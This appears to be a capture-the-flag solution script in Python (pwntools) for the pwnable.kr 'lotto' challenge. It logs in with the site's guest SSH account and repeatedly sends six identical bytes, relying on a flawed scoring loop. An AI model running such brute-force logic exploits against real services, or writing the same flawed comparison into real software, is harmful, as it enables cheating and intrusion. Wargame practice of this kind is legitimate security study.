from pwn import *

# join the game
sh = ssh('lotto', 'pwnable.kr', password='guest', port=2222)
p = sh.process('./lotto')

# the issue is, that when the ' lotto.c' logic calculates the score, 
# every number from the 'random' pool is going to be matched against every number from the input.

# so if we use an input of 6 same numbers, we will get a score of 6, because every number from
#  the pool will be matched against every number from the input.


# just repeat the guessing process until we get the flag
for i in range(1000):
    # we dont have to print any of these lines, its just for debugging
    print(p.recvlines(3))

    p.sendline('1')
    print(p.recvline(1))
    # the input bytes needs to be between 1 and 45
    # cause the numbers from the random pool will be n mod 45 + 1
    p.sendline('------')

    print(p.recvline())

    message = p.recvline().decode()
    # message = p.recv().decode()
    if 'bad' not in message:
        print('Found the flag')
        print(p.recv())
        break

sh.close()